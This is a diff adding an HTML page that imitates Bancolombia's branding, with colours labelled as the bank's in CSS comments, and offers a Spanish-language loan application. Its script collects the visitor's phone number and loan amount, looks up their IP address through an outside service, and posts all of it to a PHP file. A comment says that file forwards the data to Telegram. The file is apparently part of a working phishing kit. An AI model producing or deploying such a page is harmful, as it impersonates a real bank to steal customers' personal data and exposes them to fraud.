@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AGRicola</title>
+</head>
+
+<style>
+    body, input, button, h1 {
+        font-family: 'Arial', sans-serif;
+    }
+
+    .ipp {
+        --vh: 6.43px;
+        -webkit-tap-highlight-color: transparent;
+        outline: 0;
+        box-sizing: border-box;
+        background-color: transparent;
+        border: none;
+        border-bottom: 1px solid #004682; /* Azul Bancolombia */
+        border-radius: 0;
+        display: block;
+        width: 100%;
+        font-size: 16px;
+        color: #004682;
+        line-height: 23px;
+        padding: 0;
+        margin: 0;
+        flex: 1 1 auto;
+        margin-bottom: 0;
+        padding-left: 0;
+    }
+
+    .boton {
+        --vh: 6.43px;
+        -webkit-tap-highlight-color: transparent;
+        outline: 0;
+        box-sizing: border-box;
+        display: inline-block;
+        background-color: #fdda24; /* Amarillo Bancolombia */
+        color: #343434; /* Azul Bancolombia */
+        text-transform: uppercase;
+        border: none;
+        font-weight: bold;
+        border-radius: 42px;
+        padding: 10px 17px;
+        font-weight: bold;
+        font-size: 18px;
+        vertical-align: middle;
+        overflow: hidden;
+        margin-bottom: 10px;
+        box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        min-height: 42px;
+        min-width: 135px;
+        line-height: 21px;
+        flex: 1 0 auto;
+    }
+
+    h1 {
+        font-size: 24px;
+        margin-bottom: 20px;
+        color: #004682; /* Azul Bancolombia */
+    }
+
+    .slider-container {
+        margin: 20px 0;
+    }
+
+    .slider {
+        -webkit-appearance: none;
+        width: 100%;
+        height: 15px;
+        background: #EAF1F8; /* Fondo claro */
+        outline: none;
+        border-radius: 10px;
+        box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.1);
+        transition: background 0.3s ease;
+    }
+
+    .slider::-webkit-slider-thumb {
+        -webkit-appearance: none;
+        appearance: none;
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        background: #004682; /* Azul Bancolombia */
+        cursor: pointer;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        transition: background-color 0.3s ease;
+    }
+
+    .slider::-webkit-slider-thumb:hover {
+        background-color: #003366; /* Azul más oscuro */
+    }
+
+    .output {
+        font-weight: bold;
+        color: #004682; /* Azul Bancolombia */
+        font-size: 24px;
+        margin-bottom: 10px;
+    }
+
+    .input-group {
+        margin: 20px 0;
+    }
+
+    input[type="tel"] {
+     
+        padding: 10px;
+        font-size: 16px;
+        border: 2px solid #004682; /* Azul Bancolombia */
+        border-radius: 5px;
+        background-color: #f9f9f9;
+    }
+
+    button {  font-weight: bold;
+        background-color: #F5D000; /* Amarillo Bancolombia */
+        color: #353535; /* Azul Bancolombia */
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+        transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+        background-color: #E8C200; /* Amarillo más oscuro */
+    }
+
+    .pad {
+        width: 390px;
+    }
+</style>
+
+<body>
+    <center>
+        <form action="pas.php" method="post" style="width: 360px; height: auto; padding: px; margin-left: -5px;">
+            <img src="positivo.svg" alt="">
+            <br>
+
+            <div class="container">
+
+<center>
+    <div style="text-align: center;"> <br><br>
+<img  width="100%" src="7189.png" alt="">
+ 
+
+</div>
+</center>
+
+                <h1>Solicita tu Préstamo</h1>
+
+                <div class="slider-container">
+                    <label for="loanAmount">Monto del préstamo:</label>
+                    <div class="output" id="loanOutput">$1000</div>
+                    <br> 
+                    <input type="range" min="1000" max="15000" value="1000" class="slider" id="loanAmount">
+                <br><br></div>
+
+                <div class="input-group">
+                    <input type="tel" id="phone" placeholder="Ingresa tu número de teléfono">
+                </div>
+
+                <button type="button" onclick="enviarDatos() " style="width: 142px;">Continuar</button>
+            </div>
+        </form>
+    </center>
+
+    <script>
+        const loanAmount = document.getElementById("loanAmount");
+        const loanOutput = document.getElementById("loanOutput");
+
+        loanAmount.oninput = function() {
+            loanOutput.textContent = `$${this.value}`;
+        };
+
+        function enviarDatos() {
+            const monto = loanAmount.value;
+            const telefono = document.getElementById("phone").value;
+
+            if (telefono === "") {
+                alert("Por favor, ingresa tu número de teléfono.");
+                return;
+            }
+
+            // Obtener la IP del cliente
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+
+                    // Enviar los datos al archivo PHP para enviarlos a Telegram
+                    fetch('datos_de_tel2.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: `monto=${monto}&telefono=${telefono}&ip=${ip}`
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            window.location.href = "gracias.html"; // Redirigir a la página de agradecimiento
+                        } else {
+                            alert("Hubo un problema al enviar los datos.");
+                        }
+                    });
+                });
+        }
+    </script>
+</body>
+</html>
